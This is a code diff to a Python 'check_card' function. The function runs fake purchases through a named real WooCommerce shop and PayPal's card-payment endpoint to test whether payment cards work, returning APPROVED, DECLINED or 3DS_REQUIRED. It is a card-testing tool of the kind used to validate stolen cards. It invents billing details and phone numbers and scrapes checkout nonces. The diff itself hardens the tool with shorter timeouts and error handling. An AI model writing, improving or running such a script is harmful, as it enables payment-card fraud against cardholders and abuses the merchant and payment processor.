@@ -61,20 +61,27 @@ def check_card(card_details):
         num = generate_phone_number()
 
         # 1. Add to cart
-        multipart_data = MultipartEncoder(fields={'quantity': '1', 'add-to-cart': '4451'})
-        r.post(
-            'https://switchupcb.com/shop/i-buy/',
-            headers={'user-agent': user, 'content-type': multipart_data.content_type},
-            data=multipart_data,
-            timeout=60
-        )
+        try:
+            multipart_data = MultipartEncoder(fields={'quantity': '1', 'add-to-cart': '4451'})
+            r.post(
+                'https://switchupcb.com/shop/i-buy/',
+                headers={'user-agent': user, 'content-type': multipart_data.content_type},
+                data=multipart_data,
+                timeout=10
+            )
+        except requests.exceptions.Timeout:
+            return {"message": "❌DECLINED", "response_text": "ERROR: TIMEOUT_AT_CART"}
+        except requests.exceptions.RequestException as e:
+            return {"message": "❌DECLINED", "response_text": f"ERROR: {str(e)}"}
 
         # 2. Get checkout tokens
-        response_checkout = r.get('https://switchupcb.com/checkout/', headers={'user-agent': user}, timeout=60)
         try:
+            response_checkout = r.get('https://switchupcb.com/checkout/', headers={'user-agent': user}, timeout=10)
             check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response_checkout.text).group(1)
             create = re.search(r'create_order.*?nonce":"(.*?)"', response_checkout.text).group(1)
-        except AttributeError:
+        except requests.exceptions.Timeout:
+            return {"message": "❌DECLINED", "response_text": "ERROR: TIMEOUT_AT_CHECKOUT"}
+        except Exception:
             return {"message": "❌DECLINED", "response_text": "ERROR: SCRAPE_FAILED"}
 
         # 3. Create PayPal Order
@@ -86,15 +93,16 @@ def check_card(card_details):
             'funding_source': 'card',
             'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
         }
-        response_create = r.post(
-            'https://switchupcb.com/?wc-ajax=ppc-create-order',
-            json=json_data_create,
-            headers={'user-agent': user},
-            timeout=60
-        )
-        order_data = {}
         try:
+            response_create = r.post(
+                'https://switchupcb.com/?wc-ajax=ppc-create-order',
+                json=json_data_create,
+                headers={'user-agent': user},
+                timeout=10
+            )
             order_data = response_create.json()
+        except requests.exceptions.Timeout:
+            return {"message": "❌DECLINED", "response_text": "ERROR: TIMEOUT_AT_CREATE_ORDER"}
         except Exception:
             return {"message": "❌DECLINED", "response_text": "ERROR: ORDER_JSON_FAILED"}
 
@@ -110,22 +118,26 @@ def check_card(card_details):
                 'card': {'cardNumber': n, 'expirationDate': f'{mm}/20{yy}', 'securityCode': cvc},
             }
         }
-        response_final = requests.post(
-            'https://www.paypal.com/graphql?fetch_credit_form_submit',
-            headers={'user-agent': user, 'content-type': 'application/json'},
-            json=json_data_graphql,
-            timeout=60
-        )
-
-        # Extract JSON safely
         try:
+            response_final = requests.post(
+                'https://www.paypal.com/graphql?fetch_credit_form_submit',
+                headers={'user-agent': user, 'content-type': 'application/json'},
+                json=json_data_graphql,
+                timeout=10
+            )
             raw_json = response_final.json()
+        except requests.exceptions.Timeout:
+            return {"message": "❌DECLINED", "response_text": "ERROR: TIMEOUT_AT_PAYPAL"}
         except Exception:
             raw_json = {}
 
         # Check if 3DS required
-        if "is3DSecureRequired" in response_final.text:
-            return {"message": "✅APPROVED", "response_text": "3DS_REQUIRED"}
+        try:
+            flags = raw_json.get("data", {}).get("approveGuestPaymentWithCreditCard", {}).get("flags", {})
+            if flags.get("is3DSecureRequired"):
+                return {"message": "3DS_REQUIRED", "response_text": "3DSecure step required"}
+        except Exception:
+            pass
 
         # Extract error code
         error_text = "ERROR: UNKNOWN"
